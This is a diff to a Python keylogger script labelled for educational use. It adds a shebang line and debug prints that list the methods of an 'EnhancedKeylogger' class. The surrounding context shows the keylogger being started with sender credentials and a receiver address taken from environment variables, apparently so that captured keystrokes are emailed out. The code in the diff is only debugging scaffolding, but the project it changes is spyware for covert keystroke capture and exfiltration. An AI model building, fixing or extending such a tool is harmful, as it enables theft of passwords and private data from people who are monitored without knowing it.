@@ -10,6 +10,9 @@
 #                                    KEYLOGGER (Linux Edition)
 
 # ⚠️ FOR EDUCATIONAL PURPOSES ONLY. USE WITH EXPLICIT CONSENT ⚠️
+#!/usr/bin/env python3
+# -*- coding: utf-8 -*-
+
 import os
 import tempfile
 import threading
@@ -230,6 +233,8 @@ if __name__ == "__main__":
     Unauthorized use violates privacy laws and ethics
     ===========================================
     """)
+    # DEBUG: Verify class methods
+    print("[DEBUG] Methods in EnhancedKeylogger class:", dir(EnhancedKeylogger))
     try:
         keylogger = EnhancedKeylogger(
             log_interval=300,
@@ -238,6 +243,8 @@ if __name__ == "__main__":
             password=os.getenv("EMAIL_PASSWORD"),
             to_email=os.getenv("RECEIVER_EMAIL")
         )
+        # DEBUG: Verify instance methods
+        print("[DEBUG] Methods in keylogger instance:", dir(keylogger))
         keylogger.start()
     except Exception as e:
         logging.critical(f"Initialization failed: {e}")
